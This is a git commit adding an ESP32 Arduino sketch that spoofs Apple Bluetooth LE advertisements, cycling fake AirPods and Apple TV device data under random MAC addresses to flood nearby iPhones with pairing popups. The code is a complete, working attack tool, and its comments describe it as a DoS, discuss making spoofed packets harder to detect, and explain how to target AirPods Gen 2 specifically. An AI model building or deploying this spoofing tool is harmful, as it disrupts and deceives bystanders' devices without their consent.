5a666052f9bebc5436c8c67aa48f869ceef3d920
Andrey <derty7737@gmail.com>
2023-10-27 01:43:23 +0300

    init 2

---
+++ main.cpp
@@ -0,0 +1,114 @@
+// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
+// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
+// See the README for more info
+#include <Arduino.h>
+
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
+
+#include "devices.hpp"
+
+BLEAdvertising *pAdvertising;  // global variable
+uint32_t delaySeconds = 1;
+
+void setup() {
+  Serial.begin(115200);
+  Serial.println("Starting ESP32 BLE");
+
+  // This is specific to the AirM2M ESP32 board
+  // https://wiki.luatos.com/chips/esp32c3/board.html
+  pinMode(12, OUTPUT);
+  pinMode(13, OUTPUT);
+
+  BLEDevice::init("AirPods 69");
+
+  // Create the BLE Server
+  BLEServer *pServer = BLEDevice::createServer();
+  pAdvertising = pServer->getAdvertising();
+
+  // seems we need to init it with an address in setup() step.
+  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+}
+
+void loop() {
+  // Turn lights on during "busy" part
+  digitalWrite(12, HIGH);
+  digitalWrite(13, HIGH);
+
+  // First generate fake random MAC
+  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+  for (int i = 0; i < 6; i++){
+    dummy_addr[i] = random(256);
+
+    // It seems for some reason first 4 bits
+    // Need to be high (aka 0b1111), so we 
+    // OR with 0xF0
+    if (i == 0){
+      dummy_addr[i] |= 0xF0;
+    }
+  }
+
+  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+
+  // Randomly pick data from one of the devices
+  // First decide short or long
+  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
+  int device_choice = random(2);
+  if (device_choice == 0){
+    int index = random(17);
+    oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
+  } else {
+    int index = random(12);
+    oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+  }
+
+/*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
+      the three advertising PDU types when you want to connect to Apple devices.
+          // 0 = ADV_TYPE_IND, 
+          // 1 = ADV_TYPE_SCAN_IND
+          // 2 = ADV_TYPE_NONCONN_IND
+      
+      Randomly using any of these PDU types may increase detectability of spoofed packets. 
+
+      What we know for sure:
+      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
+                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
+  */
+  
+  int adv_type_choice = random(3);
+  if (adv_type_choice == 0){
+    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
+  } else if (adv_type_choice == 1){
+    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
+  } else {
+    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
+  }
+
+  // Set the device address, advertisement data
+  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
+  pAdvertising->setAdvertisementData(oAdvertisementData);
+  
+  // Set advertising interval
+  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
+      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
+      
+      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
+  */
+
+  //pAdvertising->setMinInterval(0x20);
+  //pAdvertising->setMaxInterval(0x20);
+  //pAdvertising->setMinPreferred(0x20);
+  //pAdvertising->setMaxPreferred(0x20);
+
+  // Start advertising
+  Serial.println("Sending Advertisement...");
+  pAdvertising->start();
+
+  // Turn lights off while "sleeping"
+  digitalWrite(12, LOW);
+  digitalWrite(13, LOW);
+  delay(delaySeconds * 1000); // delay for delaySeconds seconds
+  pAdvertising->stop();
+}
